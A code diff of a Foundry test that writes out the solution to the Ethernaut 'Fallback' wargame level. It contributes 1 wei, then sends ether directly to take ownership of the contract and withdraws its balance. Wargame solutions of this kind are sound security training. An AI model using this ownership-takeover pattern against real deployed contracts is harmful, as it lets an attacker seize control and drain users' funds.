@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.12;
+pragma solidity ^0.8.12;
 
 import "ds-test/test.sol";
 import "forge-std/Vm.sol";
@@ -24,10 +24,15 @@ contract FallbackTest is DSTest {
         ethernaut.registerLevel(fallbackFactory);
         vm.startPrank(eoaAddress);
         address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
-        Fallback ethernautFallback = Fallback(payable(levelAddress));
+        Fallback fallbackContract = Fallback(payable(levelAddress));
 
         // Solution
-
+        fallbackContract.contribute{value: 1 wei}(); // contribute 1 wei
+        assertEq(fallbackContract.getContribution(), 1);
+        (bool success, bytes memory data) = address(fallbackContract).call{value: 1 wei}("");
+        assert(success);
+        assertEq(fallbackContract.owner(), eoaAddress);
+        fallbackContract.withdraw();
 
         // Submission
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
